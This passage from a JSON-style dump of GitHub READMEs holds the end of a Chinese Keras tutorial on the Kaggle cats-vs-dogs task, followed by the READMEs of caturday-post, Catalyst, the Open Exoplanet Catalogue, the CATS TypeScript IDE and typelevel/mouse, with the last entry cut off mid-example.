\u7684\u7279\u5f81\u5411\u91cf\uff09\u3002\u6bcf\u4e2a\u6a21\u578b\u5bfc\u51fa\u7684\u65f6\u95f4\u90fd\u633a\u957f\u7684\uff0c\u5728 aws p2.xlarge \u4e0a\u5927\u6982\u9700\u8981\u7528\u5341\u5206\u949f\u5230\u4e8c\u5341\u5206\u949f\u3002 \u8fd9\u4e09\u4e2a\u6a21\u578b\u90fd\u662f\u5728 ImageNet \u4e0a\u9762\u9884\u8bad\u7ec3\u8fc7\u7684\uff0c\u6240\u4ee5\u6bcf\u4e00\u4e2a\u6a21\u578b\u90fd\u53ef\u4ee5\u8bf4\u662f\u8eab\u7ecf\u767e\u6218\uff0c\u901a\u8fc7\u8fd9\u4e09\u4e2a\u8001\u53f8\u673a\u5bfc\u51fa\u7684\u7279\u5f81\u5411\u91cf\uff0c\u53ef\u4ee5\u9ad8\u5ea6\u6982\u62ec\u4e00\u5f20\u56fe\u7247\u6709\u54ea\u4e9b\u5185\u5bb9\u3002\n\u6700\u540e\u5bfc\u51fa\u7684 h5 \u6587\u4ef6\u5305\u62ec\u4e09\u4e2a numpy \u6570\u7ec4\uff1a\n\ntrain (25000, 2048)\ntest (12500, 2048)\nlabel (25000,)\n\n\u53c2\u8003\u8d44\u6599\uff1a\n\nResNet 15.12\nInception v3 15.12\nXception 16.10\n\n\u8f7d\u5165\u7279\u5f81\u5411\u91cf\n\u7ecf\u8fc7\u4e0a\u9762\u7684\u4ee3\u7801\u4ee5\u540e\uff0c\u6211\u4eec\u83b7\u5f97\u4e86\u4e09\u4e2a\u7279\u5f81\u5411\u91cf\u6587\u4ef6\uff0c\u5206\u522b\u662f\uff1a\n\ngap_ResNet50.h5\ngap_InceptionV3.h5\ngap_Xception.h5\n\n\u6211\u4eec\u9700\u8981\u8f7d\u5165\u8fd9\u4e9b\u7279\u5f81\u5411\u91cf\uff0c\u5e76\u4e14\u5c06\u5b83\u4eec\u5408\u6210\u4e00\u6761\u7279\u5f81\u5411\u91cf\uff0c\u7136\u540e\u8bb0\u5f97\u628a X \u548c y \u6253\u4e71\uff0c\u4e0d\u7136\u4e4b\u540e\u6211\u4eec\u8bbe\u7f6evalidation_split\u7684\u65f6\u5019\u4f1a\u51fa\u95ee\u9898\u3002\u8fd9\u91cc\u8bbe\u7f6e\u4e86 numpy \u7684\u968f\u673a\u6570\u79cd\u5b50\u4e3a2017\uff0c\u8fd9\u6837\u53ef\u4ee5\u786e\u4fdd\u6bcf\u4e2a\u4eba\u8dd1\u8fd9\u4e2a\u4ee3\u7801\uff0c\u8f93\u51fa\u90fd\u80fd\u662f\u4e00\u6837\u7684\u7ed3\u679c\u3002\nimport h5py\nimport numpy as np\nfrom sklearn.utils import shuffle\nnp.random.seed(2017)\n\nX_train = []\nX_test = []\n\nfor filename in [\"gap_ResNet50.h5\", \"gap_Xception.h5\", \"gap_InceptionV3.h5\"]:\n    with h5py.File(filename, 'r') as h:\n        X_train.append(np.array(h['train']))\n        X_test.append(np.array(h['test']))\n        y_train = np.array(h['label'])\n\nX_train = np.concatenate(X_train, axis=1)\nX_test = np.concatenate(X_test, axis=1)\n\nX_train, y_train = shuffle(X_train, y_train)\n\u6784\u5efa\u6a21\u578b\n\u6a21\u578b\u7684\u6784\u5efa\u5f88\u7b80\u5355\uff0c\u76f4\u63a5 dropout \u7136\u540e\u5206\u7c7b\u5c31\u597d\u4e86\u3002\nfrom keras.models import *\nfrom keras.layers import *\n\nnp.random.seed(2017)\n\ninput_tensor = Input(X_train.shape[1:])\nx = Dropout(0.5)(input_tensor)\nx = Dense(1, activation='sigmoid')(x)\nmodel = Model(input_tensor, x)\n\nmodel.compile(optimizer='adadelta',\n              loss='binary_crossentropy',\n              metrics=['accuracy'])\n\u6211\u4eec\u8fd8\u53ef\u4ee5\u5bf9\u6a21\u578b\u8fdb\u884c\u53ef\u89c6\u5316\uff1a\ndigraph G{\n    node [shape=record]\n    a[label=\"ResNet50|{input:|output:}|{(224, 224, 3)|(2048)}\"]\n    b[label=\"InceptionV3|{input:|output:}|{(299, 299, 3)|(2048)}\"]\n    c[label=\"Xception|{input:|output:}|{(299, 299, 3)|(2048)}\"]\n    Merge[label=\"Merge|{input:|output:}|{(3, 2048)|(6144)}\"]\n    Dropout[label=\"Dropout|Rate:|0.5\"]\n    Output[label=\"Output|{input:|output:}|{(6144)|(1)}\"]\n    Image -> a -> Merge\n    Image -> b -> Merge\n    Image -> c -> Merge\n    Merge -> Dropout -> Output\n}\n\n\u8bad\u7ec3\u6a21\u578b\n\u6a21\u578b\u6784\u4ef6\u597d\u4e86\u4ee5\u540e\uff0c\u6211\u4eec\u5c31\u53ef\u4ee5\u8fdb\u884c\u8bad\u7ec3\u4e86\uff0c\u8fd9\u91cc\u6211\u4eec\u8bbe\u7f6e\u9a8c\u8bc1\u96c6\u5927\u5c0f\u4e3a 20% \uff0c\u4e5f\u5c31\u662f\u8bf4\u8bad\u7ec3\u96c6\u662f20000\u5f20\u56fe\uff0c\u9a8c\u8bc1\u96c6\u662f5000\u5f20\u56fe\u3002\nmodel.fit(X_train, y_train, batch_size=128, nb_epoch=8, validation_split=0.2)\nTrain on 20000 samples, validate on 5000 samples\nEpoch 1/8\n20000/20000 [==============================] - 1s - loss: 0.1193 - acc: 0.9591 - val_loss: 0.0283 - val_acc: 0.9936\nEpoch 2/8\n20000/20000 [==============================] - 0s - loss: 0.0319 - acc: 0.9898 - val_loss: 0.0181 - val_acc: 0.9952\nEpoch 3/8\n20000/20000 [==============================] - 0s - loss: 0.0252 - acc: 0.9916 - val_loss: 0.0172 - val_acc: 0.9934\nEpoch 4/8\n20000/20000 [==============================] - 0s - loss: 0.0214 - acc: 0.9936 - val_loss: 0.0140 - val_acc: 0.9956\nEpoch 5/8\n20000/20000 [==============================] - 0s - loss: 0.0200 - acc: 0.9926 - val_loss: 0.0139 - val_acc: 0.9954\nEpoch 6/8\n20000/20000 [==============================] - 0s - loss: 0.0189 - acc: 0.9933 - val_loss: 0.0129 - val_acc: 0.9956\nEpoch 7/8\n20000/20000 [==============================] - 0s - loss: 0.0170 - acc: 0.9946 - val_loss: 0.0123 - val_acc: 0.9960\nEpoch 8/8\n20000/20000 [==============================] - 0s - loss: 0.0163 - acc: 0.9945 - val_loss: 0.0119 - val_acc: 0.9958\nOut[4]:\n\n\n\u6211\u4eec\u53ef\u4ee5\u770b\u5230\uff0c\u8bad\u7ec3\u7684\u8fc7\u7a0b\u5f88\u5feb\uff0c\u5341\u79d2\u4ee5\u5185\u5c31\u80fd\u8bad\u7ec3\u5b8c\uff0c\u51c6\u786e\u7387\u4e5f\u5f88\u9ad8\uff0c\u5728\u9a8c\u8bc1\u96c6\u4e0a\u6700\u9ad8\u8fbe\u5230\u4e8699.6%\u7684\u51c6\u786e\u7387\uff0c\u8fd9\u76f8\u5f53\u4e8e\u4e00\u5343\u5f20\u56fe\u53ea\u9519\u4e864\u5f20\uff0c\u53ef\u4ee5\u8bf4\u6bd4\u6211\u8fd8\u5389\u5bb3\u3002\n\u9884\u6d4b\u6d4b\u8bd5\u96c6\n\u6a21\u578b\u8bad\u7ec3\u597d\u4ee5\u540e\uff0c\u6211\u4eec\u5c31\u53ef\u4ee5\u5bf9\u6d4b\u8bd5\u96c6\u8fdb\u884c\u9884\u6d4b\uff0c\u7136\u540e\u63d0\u4ea4\u5230 kaggle \u4e0a\u770b\u770b\u6700\u7ec8\u6210\u7ee9\u4e86\u3002\ny_pred = model.predict(X_test, verbose=1)\ny_pred = y_pred.clip(min=0.005, max=0.995)\n\nimport pandas as pd\nfrom keras.preprocessing.image import *\n\ndf = pd.read_csv(\"sample_submission.csv\")\n\ngen = ImageDataGenerator()\ntest_generator = gen.flow_from_directory(\"test2\", (224, 224), shuffle=False, \n                                         batch_size=16, class_mode=None)\n\nfor i, fname in enumerate(test_generator.filenames):\n    index = int(fname[fname.rfind('/')+1:fname.rfind('.')])\n    df.set_value(index-1, 'label', y_pred[i])\n\ndf.to_csv('pred.csv', index=None)\ndf.head(10)\n\u9884\u6d4b\u8fd9\u91cc\u6211\u4eec\u7528\u5230\u4e86\u4e00\u4e2a\u5c0f\u6280\u5de7\uff0c\u6211\u4eec\u5c06\u6bcf\u4e2a\u9884\u6d4b\u503c\u9650\u5236\u5230\u4e86 [0.005, 0.995] \u4e2a\u533a\u95f4\u5185\uff0c\u8fd9\u4e2a\u539f\u56e0\u5f88\u7b80\u5355\uff0ckaggle \u5b98\u65b9\u7684\u8bc4\u4f30\u6807\u51c6\u662f LogLoss\uff0c\u5bf9\u4e8e\u9884\u6d4b\u6b63\u786e\u7684\u6837\u672c\uff0c0.995 \u548c 1 \u76f8\u5dee\u65e0\u51e0\uff0c\u4f46\u662f\u5bf9\u4e8e\u9884\u6d4b\u9519\u8bef\u7684\u6837\u672c\uff0c0 \u548c 0.005 \u7684\u5dee\u8ddd\u975e\u5e38\u5927\uff0c\u662f 15 \u548c 2 \u7684\u5dee\u522b\u3002\u53c2\u8003 LogLoss \u5982\u4f55\u5904\u7406\u65e0\u7a77\u5927\u95ee\u9898\uff0c\u4e0b\u9762\u7684\u8868\u8fbe\u5f0f\u5c31\u662f\u4e8c\u5206\u7c7b\u95ee\u9898\u7684 LogLoss \u5b9a\u4e49\u3002\n$$\\textrm{LogLoss} = - \\frac{1}{n} \\sum_{i=1}^n \\left[ y_i \\log(\\hat{y}_i) + (1 - y_i) \\log(1 - \\hat{y}_i)\\right]$$\n\n\u8fd8\u6709\u4e00\u4e2a\u503c\u5f97\u4e00\u63d0\u7684\u5730\u65b9\u5c31\u662f\u6d4b\u8bd5\u96c6\u7684\u6587\u4ef6\u540d\u4e0d\u662f\u6309 1, 2, 3 \u8fd9\u6837\u6392\u7684\uff0c\u800c\u662f\u6309\u4e0b\u9762\u7684\u987a\u5e8f\u6392\u5217\u7684\uff1a\n['test/1.jpg',\n 'test/10.jpg',\n 'test/100.jpg',\n 'test/1000.jpg',\n 'test/10000.jpg',\n 'test/10001.jpg',\n 'test/10002.jpg',\n 'test/10003.jpg',\n ......\n\n\u56e0\u6b64\u6211\u4eec\u9700\u8981\u5bf9\u6bcf\u4e2a\u6587\u4ef6\u540d\u8fdb\u884c\u5904\u7406\uff0c\u7136\u540e\u8d4b\u503c\u5230 df \u91cc\uff0c\u6700\u540e\u5bfc\u51fa\u4e3a csv \u6587\u4ef6\u3002\n\tid\tlabel\n0\t1\t0.995\n1\t2\t0.995\n2\t3\t0.995\n3\t4\t0.995\n4\t5\t0.005\n5\t6\t0.005\n6\t7\t0.005\n7\t8\t0.005\n8\t9\t0.005\n9\t10\t0.005\n\n\u603b\u7ed3\n\u6211\u4eec\u53ef\u4ee5\u4ece\u4e0a\u56fe\u4e2d\u770b\u5230\uff0c\u6a21\u578b\u5bf9\u4e8e\u524d\u5341\u4e2a\u6837\u672c\u90fd\u7ed9\u51fa\u4e86\u5f88\u80af\u5b9a\u7684\u9884\u6d4b\uff0c\u63d0\u4ea4\u5230 kaggle \u4ee5\u540e\uff0c\u5f97\u5206\u4e5f\u662f\u5f88\u68d2\uff0c0.04141\uff0c\u5728\u5168\u7403\u6392\u540d\u4e2d\u53ef\u4ee5\u6392\u523020/1314\u3002\u6211\u4eec\u5982\u679c\u8981\u7ee7\u7eed\u4f18\u5316\u6a21\u578b\u8868\u73b0\uff0c\u53ef\u4ee5\u4f7f\u7528\u66f4\u68d2\u7684\u9884\u8bad\u7ec3\u6a21\u578b\u6765\u5bfc\u51fa\u7279\u5f81\u5411\u91cf\uff0c\u6216\u8005\u5bf9\u9884\u8bad\u7ec3\u6a21\u578b\u8fdb\u884c\u5fae\u8c03\uff08fine-tune\uff09\uff0c\u6216\u8005\u8fdb\u884c\u6570\u636e\u589e\u5f3a\uff08data augmentation\uff09\u7b49\u3002\n\u53c2\u8003\u94fe\u63a5\uff1a\u9762\u5411\u5c0f\u6570\u636e\u96c6\u6784\u5efa\u56fe\u50cf\u5206\u7c7b\u6a21\u578b"}, {"title": "notwaldorf/caturday-post", "language": "HTML", "content": "caturday-post\nSend \ud83d\udc31to browsers around the world using push notifications. Behind the scenes\nit uses a Polymer platinum-push-messaging element that registers a browser for\npush notifications, and a node server that collects all the registered clients\nand sends them cats.\nPlay with it\nIn the wild, this lives on a heroku free dyno, so it gets restarted often and\ndrops all of the registered browsers. Not sure that's such a bad thing. You can:\n\nregister your browser to use push\nnotifications, and receive cats when they are sent out\nsend cats to all the\nregistered clients. The server will only send one cat a minute, because I\ndon't trust all y'all internet people to not spam me.\n\n\ud83c\udf89\ud83d\ude3b\ud83c\udf89\nConfigure it\nThere are three items that need to be configured. The ID of your Google\nDeveloper Console project, the corresponding API key, and the URL of your\nMongoDB database.\nTo find the first two, enable the API through the getting started flow.\nIgnore that it says it is setting up an Android project, and ensure that you\nenable Google Cloud Messaging.\nYou can either set up your own MongoDB server, or add one to your heroku app\nwith:\nheroku addons:create mongolab\nYou can then see the URL of your instance with\nheroku config.\nNow you need to add a file:\n\na .env file in the root of your project, that contains your config values.\nThis sets the config that should be used by the Heroku foreman tool. It should\nlook something like this:\n\nGCM_SENDER=[YOUR_PROJECT_ID]\nAPI_KEY=[YOUR_API_KEY]\nMONGOLAB_URI=[YOUR_MONGODB_URL]\n\nIf you want to publicly deploy your app to Heroku you will also need to set the\nconfig values on your live app:\nheroku config:set GCM_SENDER=[YOUR_PROJECT_ID] API_KEY=[YOUR_API_KEY]\n\nInstall it\nThis uses npm for the node server bits, and bower for the client side\nPolymer bits (in particular platinum-push-messaging, without which I would\nhave had to slave for days over service worker code. \ud83d\udc96)\nnpm install\nbower install\n\nRun it\nYou start the server with\nnode server.js\n\nThis code is also heroku ready, so you can also start it with\nforeman start\n\nIn your browser, open two tabs:\n\nindex.html, which lets the browser register for push notifications.\nYou will have to enable push notifications for this to work.\nmeow.html which sends the notifications\n(let's be honest: the cats) to all the registered clients. It should also tell you how many clients are registered.\n\nThen watch the \ud83d\udc31 roll in."}, {"title": "catalyst-team/catalyst", "language": "Python", "content": "Catalyst\n\n\n\n\n\nHigh-level utils for PyTorch DL & RL research.\nIt was developed with a focus on reproducibility,\nfast experimentation and code/ideas reusing.\nBeing able to research/develop something new,\nrather then write another regular train loop.\nBreak the cycle - use the Catalyst!\n\nCatalyst is compatible with: Python 3.6+. PyTorch 0.4.1+.\nAPI documentation and an overview of the library can be found\nhere.\nIn the examples folder\nof the repository, you can find advanced tutorials and Catalyst best practices.\nInstallation\npip install catalyst\nOverview\nCatalyst helps you write compact\nbut full-featured DL & RL pipelines in a few lines of code.\nYou get a training loop with metrics, early-stopping, model checkpointing\nand other features without the boilerplate.\nFeatures\n\nUniversal train/inference loop.\nConfiguration files for model/data hyperparameters.\nReproducibility \u2013 even source code will be saved.\nCallbacks \u2013 reusable train/inference pipeline parts.\nTraining stages support.\nEasy customization.\nPyTorch best practices (SWA, AdamW, 1Cycle, FP16 and more).\n\nStructure\n\nDL \u2013 runner for training and inference,\nall of the classic machine learning and computer vision metrics\nand a variety of callbacks for training, validation\nand inference of neural networks.\nRL \u2013 scalable Reinforcement Learning,\nactor-critic off-policy continuous actions space algorithms\nand their improvements\nwith distributed training support.\ncontrib - additional modules contributed by Catalyst users.\ndata - useful tools and scripts for data processing.\n\nGetting started: 30 seconds with Catalyst\nimport torch\nfrom catalyst.dl.experiments import SupervisedRunner\n\n# experiment setup\nlogdir = \"./logdir\"\nnum_epochs = 42\n\n# data\nloaders = {\"train\": ..., \"valid\": ...}\n\n# model, criterion, optimizer\nmodel = Net()\ncriterion = torch.nn.CrossEntropyLoss()\noptimizer = torch.optim.Adam(model.parameters())\n\n# model runner\nrunner = SupervisedRunner()\n\n# model training\nrunner.train(\n    model=model,\n    criterion=criterion,\n    optimizer=optimizer,\n    loaders=loaders,\n    logdir=logdir,\n    num_epochs=num_epochs,\n    verbose=True\n)\nDocker\nPlease see the docker folder\nfor more information and examples.\nContribution guide\nWe appreciate all contributions.\nIf you are planning to contribute back bug-fixes,\nplease do so without any further discussion.\nIf you plan to contribute new features, utility functions or extensions,\nplease first open an issue and discuss the feature with us.\nPlease see the contribution guide\nfor more information.\nCitation\nPlease use this bibtex if you want to cite this repository in your publications:\n@misc{catalyst,\n    author = {Kolesnikov, Sergey},\n    title = {Reproducible and fast DL & RL.},\n    year = {2018},\n    publisher = {GitHub},\n    journal = {GitHub repository},\n    howpublished = {\\url{https://github.com/catalyst-team/catalyst}},\n}"}, {"title": "OpenExoplanetCatalogue/open_exoplanet_catalogue", "language": "Python", "content": "Open Exoplanet Catalogue\nStatus update\nAs you might have noticed the Open Exoplanet Catalogue has been in a a dormant state for a few months, recieving only a few updates. This is mainly due to a lack of contributors. In the fall, we plan to have about 100 undegraduates in computer science work on the OEC. Their main goal will be to implement an automated way to gather data from various sources on the internet. We will keep the data fully referenced so that it is easy to find out where the data is coming from. We will also allow for manual edits of the accumulated data (as it has been in the past). All of these things together should make the OEC the most complete and most up-to-date exoplanet catalogue out there. In the meantime, please keep your pull request coming! -- Hanno Rein -- June 2016.\nAbout the Open Exoplanet Catalogue\n\n\n\nThe Open Exoplanet Catalogue is a database of all discovered extra-solar planets. New planets are usually added within 24 hours of their announcement.\nThe database is licensed under an MIT license (see below), which basically says you can do everything with it. If you use it for a scientific publication, please include a reference to the Open Exoplanet Catalogue on github or to this arXiv paper.\nThe catalogue is a community project. Please send corrections and additions via pull request or email. If you have questions or comments about git or the database, please do not hesitate to contact of the contributors directly.\nIf you are looking for a simple comma/tab separated table, you might want to check out this repository.\nHow to access the catalogue using Python\nIt is very easy to access the Open Exoplanet Catalogue using python. Here is a short snippet to print out some basic planet data. No download, no installation and no external libraries are required.\n# python 2.x\nimport xml.etree.ElementTree as ET, urllib, gzip, io\nurl = \"https://github.com/OpenExoplanetCatalogue/oec_gzip/raw/master/systems.xml.gz\"\noec = ET.parse(gzip.GzipFile(fileobj=io.BytesIO(urllib.urlopen(url).read())))\n \n# Output mass and radius of all planets \nfor planet in oec.findall(\".//planet\"):\n    print [planet.findtext(\"mass\"), planet.findtext(\"radius\")]\n \n# Find all circumbinary planets \nfor planet in oec.findall(\".//binary/planet\"):\n    print planet.findtext(\"name\")\n \n# Output distance to planetary system (in pc, if known) and number of planets in system\nfor system in oec.findall(\".//system\"):\n    print system.findtext(\"distance\"), len(system.findall(\".//planet\"))\nIf you are using python 3, replace the first three lines by\nimport xml.etree.ElementTree as ET, urllib.request, gzip, io\nurl = \"https://github.com/OpenExoplanetCatalogue/oec_gzip/raw/master/systems.xml.gz\"\noec = ET.parse(gzip.GzipFile(fileobj=io.BytesIO(urllib.request.urlopen(url).read())))\nData Structure\nThe following table shows all the possible tags in the Open Exoplanet Catalogue.\n\n\n\nTag\nCan be child of\nDescription\nUnit\n\n\n\n\nsystem\n\nThis is the root container for an entire planetary system\n\n\n\n planet\nsystem, binary, star\nThis is the container for a single planet. The planet is a free floating (orphan) planet if this tag is a child of system.\n\n\n\nstar\nsystem, binary\nThis is the container for a single star. A star can be host to one or more planets (circum-stellar planets).\n\n\n\nbinary\nsystem, binary\nA binary consists of either two stars, one star and one binary or two binaries. In addition a binary can be host to one or more planets (circum-binary planets).\n\n\n\n\n\n\n\n\n\ndeclination\nsystem\nDeclination\n+/- dd mm ss\n\n\nrightascension\nsystem\nRight ascension\nhh mm ss\n\n\ndistance\nsystem\nDistance from the Sun\nparsec\n\n\nname\nsystem, binary, star, planet\nName of this object. This tag can be used multiple times if the object has multiple Names.\n\n\n\nsemimajoraxis\nbinary, planet\nSemi-major axis of a planet (heliocentric coordinates) if child of planet. Semi-major axis of the binary if child of binary.\nAU\n\n\nseparation\nbinary, planet\nProjected separation of planet from its host, or if child of binary the projected separation from one component to the other. This tag can occur multiple times with different units. It is different from the tag semimajoraxis as it does not imply a specific orbital configuration.\nAU, arcsec\n\n\npositionangle\nbinary\nPosition angle\ndegree\n\n\neccentricity\nbinary, planet\nEccentricity\n\n\n\nperiastron\nbinary, planet\nLongitude of periastron\ndegree\n\n\nlongitude\nbinary, planet\nMean longitude at a given Epoch (same for all planets in one system)\ndegree\n\n\nmeananomaly\nbinary, planet\nMean anomaly at a given Epoch (same for all planets in one system)\ndegree\n\n\nascendingnode\nbinary, planet\nLongitude of the ascending node\ndegree\n\n\ninclination\nbinary, planet\nInclination of the orbit\ndegree\n\n\nimpactparameter\nplanet\nImpact parameter of transit\n\n\n\nepoch\nsystem\nEpoch for the orbital elements\nBJD\n\n\nperiod\nbinary, planet\nOrbital period\nday\n\n\ntransittime\nbinary, planet\nTime of the center of a transit\nBJD\n\n\nperiastrontime\nbinary, planet\nTime of periastron\nBJD\n\n\nmaximumrvtime\nbinary, planet\nTime of maximum radial velocity\nBJD\n\n\nmass\nplanet, star\nMass (or m sin(i) for radial velocity planets)\nJupiter masses (planet), Solar masses (star)\n\n\nradius\nplanet, star\nPhysical radius\nJupiter radii (planet), Solar radii (star)\n\n\ntemperature\nplanet, star\nTemperature (surface or equilibrium)\nKelvin\n\n\nage\nplanet, star\nAge\nGyr\n\n\nmetallicity\nstar\nStellar metallicity\nlog, relative to solar\n\n\nspectraltype\nstar, planet\nSpectral type\n\n\n\nmagB\nbinary, star, planet\nB magnitude\n\n\n\nmagV\nbinary, star, planet\nVisual magnitude\n\n\n\nmagR\nbinary, star, planet\nR magnitude\n\n\n\nmagI\nbinary, star, planet\nI magnitude\n\n\n\nmagJ\nbinary, star, planet\nJ magnitude\n\n\n\nmagH\nbinary, star, planet\nH magnitude\n\n\n\nmagK\nbinary, star, planet\nK magnitude\n\n\n\n\n\n\n\n\n\ndiscoverymethod\nplanet\nDiscovery method of the planet. For example: timing, RV, transit, imaging.\n\n\n\nistransiting\nplanet\nWhether the planet is transiting (1) or not (0).\n\n\n\ndescription\nplanet\nShort description of the planet\n\n\n\ndiscoveryyear\nplanet\nYear of the planet's discovery\nyyyy\n\n\nlastupdate\nplanet\nDate of the last (non-trivial) update\nyy/mm/dd\n\n\nspinorbitalignment\nplanet\nRossiter-McLaughlin Effect.\ndegree\n\n\n\nErrors\nUncertainties can be added to values using the following attributes of the tag. We assume that these uncertainties represent the standard error of the measurement (68.2% confidence level). However, keep in mind that it is often not possible to collapse an entire posterior distribution to a single number.\nThe syntax for error bars is: <mass errorminus=\"0.1\" errorplus=\"0.1\">1.0</mass>\nThe syntax for upper/lower limits is: <mass upperlimit=\"1.0\" />\nConstants\nThe Open Exoplanet Catalogue stores information using a few basis units. For stars, mass and radius units are derived from our star, Sol (the Sun). For exoplanets, mass and radius units are derived from the planet Jupiter.\nThe mass of Jupiter, the Sun, and even Earth are so huge that it is more meaningful to simply reference their mass in relation to each other, rather than common SI units. These values are approximate.\n\n\n\nRatio\nValue\n\n\n\n\nSol/Jupiter mass\n1047.566\n\n\nJupiter/Earth mass\n317.8284\n\n\nSol/Earth mass\n332,946.1\n\n\n\nIn many publications, radius measurements are quoted based on Earth\u2019s or Jupiter\u2019s equatorial radius, so we list here the relevant IAU recommended nominal constants.\n\n\n\nConstant Name\nValue\n\n\n\n\nSolar radius\n695,700 km\n\n\nJupiter equatorial radius\n71,492 km\n\n\nEarth equatorial radius\n6378.1 km\n\n\n\nThere are a few more units and standards used: degrees, days, billions of years (gigayears or Gyr), AU, parsecs, sexagesimal degrees (declination), and sexagesimal hour angle (Right Ascension). These are all much more well defined than the mass and radius units above, so we will not produce them here. Please note that the Open Exoplanet Catalogue makes no accommodation for different celestial reference frames.\nPlots\n\n\n\n\nTo create custom plots please visit this repository for example scripts.\nDownload ASCII tables\nA few words of caution: Many planetary systems are part of binary star systems. The architecture of these systems is correctly represented in the original XML files of the Open Exoplanet Catalogue. In fact, it is to my knowledge the only catalogue that can do that. However, you might prefer to work with a simpler comma or tab separated table instead of the hierarchical XML file format. During the conversion process, some information is inevitably lost. Most importantly, the architecture of the star system. One cannot easily represent an arbitrary binary/triple/quadruple system in a simple table. Additionally, if planets have multiple identifiers only the first identifier is outputted. Using the original XML file format and git, you can use the git blame functionality to find references to scientific publications for every numeric value in the database. This functionality is also lost in the conversion process.\nIn a separate repository, you will find a comma separated and a tab separated ASCII table of the Open Exoplanet Catalogue.\nDocumentation\nThis file describes the philosophy and data-format of the catalogue. However, everything should be rather self-explanatory. The actual data is in the systems directory. Each XML file corresponds to one planetary system.\nIf you are editing the file with vim, have a look at the xmledit plugin. I found it very helpful.\nHow to include references to publications\nIt seems that the most elegant place to put references to publications is the commit message.\nThis allows one to trace back each individual value in the database to the source using git blame.\nFurthermore it does not add any additional clutter to the text files themselves.\nSo, when committing any changes, please create one commit per publication and include the reference in the commit message from now on.\nDerived products\nThe following list contains links to other catalogues, websites and apps that are derived from or make use of the Open Exoplanet Catalogue.\n\noec_web: A suite of HTML pages acting as a front-end of the Open Exoplanet Catalogue. It includes visualizations of orbits, planet sizes and habitable zones. It also includes a plotting tool to generate correlation diagrams. The website is hosted at openexoplanetcatalogue.com.\noec_plots: Plots and example scripts that make use of the Open Exoplanet Catalogue.\noec_outreach: A clone of the main repository with images and tags that are mainly used for outreach purposes.\noec_iphone: Compressed files, references to refereed publications, resized images and legacy support for various versions of the mobile version are in the repository.\nExoData: A Python module for loading the catalogue into python for use with applications along with many exoplanet related equations and tools.\niPhone Exoplanet App: Popular iOS application with many visualizations of the entire catalogue. Version 9.1 and later will fully support planets in multiple star systems.\n\nLicense\nCopyright (C) 2012 Hanno Rein\nPermission is hereby granted, free of charge, to any person obtaining a copy of this database and associated scripts (the \"Database\"), to deal in the Database without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Database, and to permit persons to whom the Database is furnished to do so, subject to the following conditions:\nThe above copyright notice and this permission notice shall be included in all copies or substantial portions of the Database.\nA reference to the Database shall be included in all scientific publications that make use of the Database.\nTHE DATABASE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE DATABASE OR THE USE OR OTHER DEALINGS IN THE DATABASE."}, {"title": "jbaron/cats", "language": "JavaScript", "content": "CATS\nCATS is an IDE for TypeScript and Web developers. CATS is open source software released under the Apache 2.0 license\nand runs on Linux, Windows and OS X.  CATS itself is also written in TypeScript, so you can easily\ncustomize it to your needs if required.\nAnd who wants to develop cutting edge web applications in a boring, uninspiring IDE. So now CATS\nalso can be completely themed to your taste. And the great thing, you can use plain CSS to do so.\n\nAlthough still new features are being added, CATS is already very usable and has built-in support for\nthe following:\n\nIntelligent code editor and code completion.\nSyntax highlighting for over 110 languages (TextMate/Sublime Text.tmlanguage files can be imported).\nSupport for code snippets.\nSupport for refactoring and smart navigation.\nVery fast compilation of TypeScript to JavaScript.\nFull validation of your source code while you are typing.\nAll the typical editing features like folding, indentation and code formatting.\nRun your application from within IDE and using the WebKit debugger to debug.\nFlexible build system with support for external build systems like Grunt, Jake, Gulp and Makefiles.\n\nCATS always supports the latest versions of TypeScript, so you are able to use all the new features.\nGetting Started\nThe easiest way to start using CATS it to follow these steps:\n\n\nIn case you haven't already installed NW.js (previously known as node-webkit) on your machine, do that first.\nYou can download NW.js from the following page: NW.js downloads.\nMake sure you download at least version 0.16.x or higher, since CATS relies on some ES6 features that are missing\nfrom earlier versions. Also if you want to be able to debug, get the SDK version.\n\n\nGet the CATS binary package (it is a file called cats-x.y.z.nw). You can download it from the following location:\nCATS releases\n\n\nAfter you done just go to the directory where you downloaded the CATS package and type:\n/path/to/nw cats-x.y.z.nw\n/path/to/nw is the binary file of NW.js. On Windows, it\u2019s nw.exe; On Linux, it\u2019s nw; On Mac, it\u2019s nwjs.app/Contents/MacOS/nwjs.\nIf you already have a directory with TypeScript files, just select that directory from Project -> Open project...\nto start editing your files. Alternatively you can open any directory as a project and start adding the\ndifferent TypeScript files as you go along with your project.\nConfiguration\nCATS will look for tsconfig files in the folder you opened from within IDE (Project -> Open Project....).\nIf a tsconfig file was found, CATS will use the values configured in that file. Otherwise it will\ncreate an empty tsconfig file in the root directory and use that instead.\nTo find out more, check TSConfig File\nBugs and Issues\nIn case you encounter an issue, you can open a ticket on Github.\nAlso enhancement requests can be entered here: Github issue tracker\nTodo\nThe todo list items are tracked as enhancement requests on GitHub. You can check them out at:\nTodo List\nThere is also a milestone planning in there when some enhancements should be delivered."}, {"title": "typelevel/mouse", "language": "Scala", "content": "Mouse\nMouse is a small companion to the Cats functional programming library for Scala. It\nincludes convenience extension methods for Scala standard library classes, including some found in\nscalaz that are not in Cats.\nThe library arose from this Cats issue and is a Typelevel member.\nMouse is published for Scala 2.11, 2.12 and 2.13. For Scala.jvm:\n\"org.typelevel\" %% \"mouse\" % version\nFor scala.js:\n\"org.typelevel\" %%% \"mouse\" % version\n\n\nContent\nMouse includes enrichments for:\n\nAny\nF[A] for any F, A\nBoolean\nOption\nString\nTry\nInt\nLong\nDouble\nMap\n\nExample:\nscala> import mouse.all._\nimport mouse.all._\n\nscala> true.option(\"Its true!\")\nres0: Option[String] = Some(Its true!)\n\nscala> res0.cata(msg => s\"Message received: ${msg}\", \"No message\")\nres1: String = Message received: Its true!\n\nscala> \"1.0\".parseFloat\nres0: Either[NumberFormatException, Float] = Right(1.0F)\n\nscala> \"foo\".parseIntValidated\nres1: cats.data.Validated[NumberFormatException,Int] = Invalid(java.lang.NumberFormatException: For input string: \"foo\")\n\nscala> val t1 = scala.util.Try(new 